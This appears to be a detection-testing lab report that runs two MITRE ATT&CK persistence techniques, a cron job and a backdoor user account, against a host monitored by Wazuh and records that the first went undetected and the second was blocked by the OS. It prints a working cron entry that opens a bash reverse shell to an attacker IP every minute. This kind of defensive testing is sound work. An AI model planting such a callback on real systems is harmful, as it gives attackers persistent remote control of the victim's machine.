T1053.003
Cron Job Persistence
Tactic: Persistence
❌ Missed
Objective
Establish persistence by adding a malicious cron job that calls back to the attacker every minute.
Cron Entry Added
crontab — victim
* * * * * /bin/bash -c \
  'bash -i >& /dev/tcp/192.168.100.86/4444 0>&1'
Evidence
🖼️
SettingCronJOB.png
crontab -e to add malicious entry
crontab -l to verify
crontab -e & crontab -l — persistence confirmed
Findings
  • Cron job successfully added via the SSH session
  • Automatic reverse shell callback confirmed within 60 seconds — no attacker interaction required
  • Persistence survived session termination
Wazuh Result
❌ Missed
Neither the crontab modification nor the automatic callback were detected. FIM is not configured to monitor cron paths by default.
T1136.001
Create Local Account
Tactic: Persistence
⛔ Blocked by OS
Objective
Create a backdoor user account for persistent access.
Command
bash — victim
$ /usr/sbin/useradd -m backdoor
  Permission denied
Evidence
🖼️
PermissionDenied.png
/usr/sbin/useradd -m backdoor
Permission denied — OS blocked
useradd — blocked by OS (no sudo)
Findings
  • Permission denied — the target user has no sudo privileges
  • The command was blocked at the OS level before execution
Finding: Least privilege principle working correctly. In a real attack, privilege escalation would be required first.
Wazuh Result
⛔ N/A — Blocked by OS
Technique blocked before execution. OS-level least privilege enforcement prevented the action entirely.
